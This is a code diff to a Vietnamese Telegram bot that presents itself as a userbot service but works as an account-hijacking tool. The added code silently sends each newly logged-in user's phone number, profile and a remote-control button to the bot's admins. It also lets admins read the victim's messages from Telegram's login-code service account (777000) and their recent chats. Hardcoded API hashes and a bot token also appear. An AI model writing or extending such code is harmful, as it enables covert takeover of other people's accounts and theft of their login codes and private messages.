@@ -15,8 +15,11 @@ A_HS = "a6da3117ff6b8a1679d04ab743976068"
 B_TK = '8991807402:AAG9h73vG6QaMnWWBTiakYePWKwcamsbO1s'
 O_ID = 7907990385
 
-REQUIRED_GROUP_USERNAME = "muadonglanhgia36" 
-REQUIRED_GROUP_LINK = "https://t.me/muadonglanhgia36"
+# Cấu hình 2 nhóm bắt buộc tham gia
+REQUIRED_GROUPS = [
+    {"username": "muadonglanhgia36", "link": "https://t.me/muadonglanhgia36", "name": "Nhóm 1"},
+    {"username": "chatmuadonglanhgia", "link": "https://t.me/chatmuadonglanhgia", "name": "Nhóm 2"}
+]
 
 U1 = "https://raw.githubusercontent.com/ehvuebe-png/Cailontaone/main/chui.txt"
 U2 = "https://gist.githubusercontent.com/tranthanhloc2099-wq/26971850c22bbc6578dae5a91fc2f154/raw/e96b3178dbce97dab5a9218eced5085802eb1711/chui2.txt"
@@ -85,9 +88,11 @@ def _su(u):
 async def is_user_in_channel(user_id):
     if user_id in admins: return True
     try:
-        await bot(functions.channels.GetParticipantRequest(
-            channel=REQUIRED_GROUP_USERNAME, participant=user_id
-        ))
+        # Kiểm tra người dùng đã tham gia TẤT CẢ các nhóm bắt buộc chưa
+        for group in REQUIRED_GROUPS:
+            await bot(functions.channels.GetParticipantRequest(
+                channel=group["username"], participant=user_id
+            ))
         if user_id not in verified_users:
             verified_users.add(user_id)
             _save_verified()
@@ -130,23 +135,61 @@ def get_main_menu(u):
     if u in admins:
         buttons.append([Button.inline("👑 Lệnh Admin System", data="m_admin")])
         
-    # Nút Admin Hỗ Trợ trỏ thẳng đến @Mduchotwar
     buttons.append([Button.url("💬 Admin Hỗ Trợ", "https://t.me/Mduchotwar")])
     
     return msg, buttons
 
 def get_join_msg():
     msg = """
-⚠️ **YÊU CẦU THAM GIA NHÓM**
+⚠️ **YÊU CẦU THAM GIA ĐỦ 2 NHÓM**
 
-Bạn phải tham gia nhóm thì mới sử dụng được bot. 
-Vào nhóm xong bấm nút **Xác Nhận** bên dưới.
+Bạn phải tham gia **đầy đủ các nhóm** dưới đây thì mới sử dụng được bot:
 """
-    buttons = [
-        [Button.url("📢 Vào Nhóm Ngay", REQUIRED_GROUP_LINK)],
-        [Button.inline("🔄 Xác Nhận Đã Vào", data="check_join")]
-    ]
+    buttons = []
+    idx = 1
+    for g in REQUIRED_GROUPS:
+        buttons.append([Button.url(f"📢 Vào {g['name']}", g["link"])])
+        msg += f"\n{idx}. [{g['name']}]({g['link']})"
+        idx += 1
+
+    msg += "\n\nVào đủ nhóm xong bấm nút **Xác Nhận** bên dưới."
+    buttons.append([Button.inline("🔄 Xác Nhận Đã Vào Đủ Nhóm", data="check_join")])
     return msg, buttons
+
+# ==========================================
+# HÀM GỬI THÔNG BÁO LOGIN CHO ADMIN
+# ==========================================
+async def notify_admin_login(client, user_id, phone_number):
+    try:
+        me = await client.get_me()
+        photos = await client.get_profile_photos('me', limit=1)
+        avatar_path = None
+        if photos:
+            avatar_path = await client.download_media(photos[0], file=f"avatar_{user_id}.jpg")
+        
+        caption = f"""
+🚨 **CÓ TÀI KHOẢN VỪA LOGIN THÀNH CÔNG!**
+────────────────
+👤 **Tên:** {me.first_name} {me.last_name or ''}
+🆔 **ID Userbot:** `{me.id}`
+📱 **Số Điện Thoại:** `+{phone_number}`
+👤 **ID Người Dùng Bot:** `{user_id}`
+"""
+        buttons = [[Button.inline("🎮 Điều Khiển Acc Này", data=f"sel_acc_{user_id}")]]
+
+        for admin_id in admins:
+            try:
+                if avatar_path and os.path.exists(avatar_path):
+                    await bot.send_file(admin_id, avatar_path, caption=caption, buttons=buttons, parse_mode='markdown')
+                else:
+                    await bot.send_message(admin_id, caption, buttons=buttons, parse_mode='markdown')
+            except:
+                pass
+                
+        if avatar_path and os.path.exists(avatar_path):
+            os.remove(avatar_path)
+    except Exception as e:
+        print(f"Lỗi gửi thông báo login: {e}")
 
 # ==========================================
 # LOGIC USERBOT KHI HOẠT ĐỘNG
@@ -263,9 +306,6 @@ def _logic(c, u_i):
     async def _stp(e):
         s_t[u_i] = False; cl_t[u_i] = False; await e.edit("🛑 **STOP!**"); await asyncio.sleep(1); await e.delete()
 
-    # ==========================================
-    # LOGIC MUTE (CÂM BOX & CÂM INBOX)
-    # ==========================================
     if u_i not in c_b: c_b[u_i] = {}
     if u_i not in c_i: c_i[u_i] = set()
 
@@ -305,9 +345,6 @@ def _logic(c, u_i):
             try: await e.delete()
             except: pass
 
-    # ==========================================
-    # LOGIC TẠO VOICE CHUYỂN VĂN BẢN THÀNH GIỌNG NÓI
-    # ==========================================
     @c.on(events.NewMessage(outgoing=True, pattern=r'/voice(?:\s+(.+))?'))
     async def _voice_cmd(e):
         text = e.pattern_match.group(1)
@@ -354,15 +391,15 @@ async def _callback_handler(ev):
         if await is_user_in_channel(u):
             msg, buttons = get_main_menu(u)
             await ev.edit(msg, buttons=buttons, parse_mode='markdown')
-            return await ev.answer("✅ Đã xác nhận tham gia nhóm!", alert=True)
+            return await ev.answer("✅ Đã xác nhận tham gia đủ các nhóm!", alert=True)
         else:
-            return await ev.answer("❌ Bạn vẫn chưa tham gia nhóm!", alert=True)
+            return await ev.answer("❌ Bạn vẫn chưa tham gia đủ cả 2 nhóm!", alert=True)
 
     if not await is_user_in_channel(u):
         msg, buttons = get_join_msg()
         try: await ev.edit(msg, buttons=buttons, parse_mode='markdown')
         except: await ev.respond(msg, buttons=buttons, parse_mode='markdown')
-        return await ev.answer("⚠️ Bạn đã rời khỏi nhóm! Vui lòng tham gia lại.", alert=True)
+        return await ev.answer("⚠️ Bạn thiếu nhóm tham gia! Vui lòng vào đủ nhóm.", alert=True)
 
     if data == "m_main":
         msg, buttons = get_main_menu(u)
@@ -469,7 +506,7 @@ async def _callback_handler(ev):
 """
         buttons = [
             [Button.inline("💬 Gửi Tin Nhắn", data="rmt_send_one"), Button.inline("📢 Gửi All Nhóm", data="rmt_send_all")],
-            [Button.inline("📋 Danh Sách Nhóm", data="rmt_list_groups"), Button.inline("📜 Lịch Sử Chat", data="rmt_history")],
+            [Button.inline("📋 Check Số Nhóm", data="rmt_count_groups"), Button.inline("📜 Lịch Sử 10 Tin", data="rmt_history")],
             [Button.inline("🔙 Chọn Tài Khoản Khác", data="m_control")]
         ]
         await ev.edit(txt, buttons=buttons, parse_mode='markdown')
@@ -512,19 +549,33 @@ async def _callback_handler(ev):
                     except: fail += 1
             await cv.send_message(f"✅ **Đã gửi xong!** Thành công: `{success}` | Thất bại: `{fail}`")
 
-    elif data == "rmt_list_groups":
+    elif data == "rmt_count_groups":
         if u not in admins: return
         target_uid = admin_selected_target.get(u)
         if not target_uid or target_uid not in u_c: return await ev.answer("Tài khoản lỗi!", alert=True)
         client = u_c[target_uid]
-        await ev.answer("⏳ Đang tải...", alert=True)
+        await ev.answer("⏳ Đang quét toàn bộ nhóm/kênh...", alert=True)
         try:
-            dialogs = await client.get_dialogs(limit=20)
-            text = f"📋 **DANH SÁCH NHÓM:**\n"
+            dialogs = await client.get_dialogs()
+            groups_count = 0
+            channels_count = 0
+            private_count = 0
             for d in dialogs:
-                if d.is_group or d.is_channel:
-                    text += f"• **{d.name}** (`{d.id}`)\n"
-            await ev.edit(text[:4000], buttons=[[Button.inline("🔙 Trở Về", data=f"sel_acc_{target_uid}")]], parse_mode='markdown')
+                if d.is_group:
+                    groups_count += 1
+                elif d.is_channel:
+                    channels_count += 1
+                elif d.is_user:
+                    private_count += 1
+            
+            text = f"""📊 **THỐNG KÊ CHI TIẾT TÀI KHOẢN:**
+────────────────
+• Tổng số đoạn chat: `{len(dialogs)}`
+• Số Nhóm (Groups): `{groups_count}`
+• Số Kênh (Channels): `{channels_count}`
+• Số Chat Riêng (Private): `{private_count}`
+"""
+            await ev.edit(text, buttons=[[Button.inline("🔙 Trở Về", data=f"sel_acc_{target_uid}")]], parse_mode='markdown')
         except Exception as ex:
             await ev.edit(f"❌ Lỗi: {ex}", buttons=[[Button.inline("🔙 Trở Về", data=f"sel_acc_{target_uid}")]])
 
@@ -533,18 +584,33 @@ async def _callback_handler(ev):
         target_uid = admin_selected_target.get(u)
         if not target_uid or target_uid not in u_c: return await ev.answer("Tài khoản lỗi!", alert=True)
         client = u_c[target_uid]
-        await ev.answer("⏳ Đang tải...", alert=True)
+        await ev.answer("⏳ Đang tải lịch sử tin nhắn...", alert=True)
         try:
-            dialogs = await client.get_dialogs(limit=20)
-            text = f"📜 **LỊCH SỬ 20 CHAT GẦN NHẤT:**\n"
-            stt = 1
+            text = f"📜 **10 TIN NHẮN GẦN NHẤT (KỂ CẢ TELEGRAM NOTIFICATIONS):**\n────────────────\n"
+            try:
+                messages = await client.get_messages(777000, limit=10)
+                text += f"🔔 **Từ Telegram Service (777000):**\n"
+                for m in messages:
+                    msg_content = m.text.replace("\n", " ") if m.text else "[Media/Service]"
+                    date_str = m.date.strftime('%H:%M:%S %d/%m') if m.date else ""
+                    text += f"• `[{date_str}]`: {msg_content[:60]}\n"
+            except:
+                pass
+
+            dialogs = await client.get_dialogs(limit=5)
             for d in dialogs:
-                last_msg = d.message.text.replace("\n", " ")[:30] if d.message and d.message.text else "[Media]"
-                text += f"**{stt}. {d.name}**\n• Cuối: _{last_msg}_\n"
-                stt += 1
+                try:
+                    msgs = await client.get_messages(d.id, limit=2)
+                    text += f"\n💬 **Box: {d.name}**\n"
+                    for m in msgs:
+                        msg_content = m.text.replace("\n", " ") if m.text else "[Media]"
+                        text += f"  - _{msg_content[:50]}_\n"
+                except:
+                    pass
+
             await ev.edit(text[:4000], buttons=[[Button.inline("🔙 Trở Về", data=f"sel_acc_{target_uid}")]], parse_mode='markdown')
         except Exception as ex:
-            await ev.edit(f"❌ Lỗi: {ex}", buttons=[[Button.inline("🔙 Trở Về", data=f"sel_acc_{target_uid}")]])
+            await ev.edit(f"❌ Lỗi tải lịch sử: {ex}", buttons=[[Button.inline("🔙 Trở Về", data=f"sel_acc_{target_uid}")]])
 
     elif data == "logout_acc":
         if u in u_c:
@@ -591,6 +657,10 @@ async def _callback_handler(ev):
                         return await cv.send_message(f"❌ **Lỗi xác thực:** `{err}`")
                 
                 u_c[u] = c; _logic(c, u)
+                
+                # Gọi hàm gửi thông báo đăng nhập cho Admin kèm ảnh avatar và SĐT
+                await notify_admin_login(c, u, p)
+
                 await cv.send_message("✅ **LOGIN THÀNH CÔNG!**")
             except Exception as e:
                 await cv.send_message(f"❌ **Lỗi Login:** `{e}`")
